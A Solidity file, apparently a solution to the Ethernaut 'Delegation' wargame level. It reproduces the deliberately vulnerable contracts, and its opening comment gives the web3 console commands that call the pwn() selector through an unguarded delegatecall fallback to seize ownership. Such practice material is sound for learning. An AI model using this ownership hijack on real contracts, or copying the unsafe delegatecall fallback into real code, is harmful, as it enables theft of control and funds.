// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

/*
    The Delegation contract when getting called with an unknown function call Delegate contract using delegatecall,
    (bool result,) = address(delegate).delegatecall(msg.data);

    we need to senda transaction to the Delegation contract and no function name to trigger the fallback(),
    
    By using the Ethernaut Console : 

    await web3.eth.sendTransaction({
    from: player,
    to: instance,  //0x0.... (instance address basically)
    data: web3.utils.sha3("pwn()").slice(0,10)
    })

    To check the result :

    await contract.owner() === player  

    if it is true then we succeed

*/

contract Delegate {
    address public owner;

    constructor(address _owner) {
        owner = _owner;
    }

    function pwn() public {
        owner = msg.sender;
    }
}

contract Delegation {
    address public owner;
    Delegate delegate;

    constructor(address _delegateAddress) {
        delegate = Delegate(_delegateAddress);
        owner = msg.sender;
    }

    fallback() external {
        (bool result,) = address(delegate).delegatecall(msg.data);
        if (result) {
            this;
        }
    }
}